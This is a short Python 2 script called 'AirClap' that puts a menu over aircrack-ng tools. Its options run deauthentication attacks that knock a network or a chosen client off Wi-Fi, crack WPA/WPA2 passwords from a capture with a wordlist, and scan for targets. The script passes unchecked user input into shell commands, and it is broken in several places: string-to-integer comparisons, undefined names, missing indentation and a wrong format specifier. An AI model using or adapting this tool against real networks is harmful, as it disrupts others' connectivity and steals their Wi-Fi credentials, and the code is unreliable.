import os
os.system("git pull")
print ("if you want to exit the program just press CTRL and c to stop")
print ("when running airodump-ng just press ctrl c to stop")
print ("----------------------------------------------------------------")
print ("AirClap, Created by Josiah Crofton, All Rights Reserved!")
print ("Scan For Networks /1")
print ("Start Monitor Mode /2")
print ("Kick Someone off Their Wifi /3")
print ("Crack a wpa2, wpa wifi password /4")
print ("Scan for clients /5")
print ("-------------------------------------------")
main_choice = raw_input("I choose:")
if main_choice == 1:
  os.system("airodump-ng wlan0mon")
  print ("Make sure you copy the bssid of the network you want to target!")
  print ("And make sure to remeber the channel")
if main_choice == 2:
  os.system("airmon-ng start wlan0")
if main_choice == 3:
  lack = raw_input("Would you like to take down a network or just a target n/T:")
  if lack == n or N:
  t = raw_input("Enter the bssid of your target!:")
  os.system("aireplay-ng -0 0 -a %s wlan0mon" % t)
  if lack == y or Y:
  p = raw_input("Enter the bssid of your target!:")
  aireplay_client = raw_input("Enter the client you want to target:")
  os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (p, aireplay_client))
if main_choice == 4:
  path = raw_input("Enter the path your pcap file:")
  b = raw_input("Enter the bssid of the network your trying to crack:")
  wordlist = raw_input("Enter the path for the wordlist:")
  os.system("aircrack-ng -w $s -b $s $s" % (wordlist, b, path))
if main_choice == 5:
  r = raw_input("Enter the bssid of the network your targeting")
  e = raw_input("Enter the channel of the network your targeting")
  os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (e, r))
  
  
  
  

print ("AirClap, Created by Josiah Crofton, All Rights Reserved!")
